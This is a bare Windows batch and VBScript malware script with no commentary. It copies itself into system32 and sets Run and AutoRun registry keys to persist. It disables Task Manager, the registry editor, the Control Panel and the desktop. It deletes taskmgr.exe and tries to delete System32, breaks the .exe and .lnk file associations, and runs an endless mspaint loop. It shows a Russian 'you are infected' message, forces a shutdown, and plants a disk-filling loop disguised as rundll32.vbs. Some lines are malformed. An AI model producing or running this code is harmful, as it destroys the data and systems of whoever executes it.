C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

copy ""%0"" "%SystemRoot%\system32\git.bat"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\git.bat" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
color a

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

del "%SystemRoot%Cursors*.*" >nul
:x
Start mspaint
goto x
assoc .lnk=.txt
copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\git.bat" /f >nul

Del C:\Windows\System32\taskmgr.exe

msg * ТЫ ЗАРАЖЕН ТАСК МЕНЕДЖЕР УДАЛЕН ЖДИ 60 СЕКУЕТ СЕКУНД

timeout 60 /nobreak
 
Shutdown.exe /s /t 120
 
Del C:/Windows/System32 /q

assoc .exe=.Ink

@echo off 

echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs 

echo do >> %systemdrive%\windows\system32\rundll32.vbs 

echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs 

echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs 

echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs 

echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs 

echo loop >> %systemdrive%\windows\system32\rundll32.vbs 

start %systemdrive%\windows\system32\rundll32.vbs 

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f 

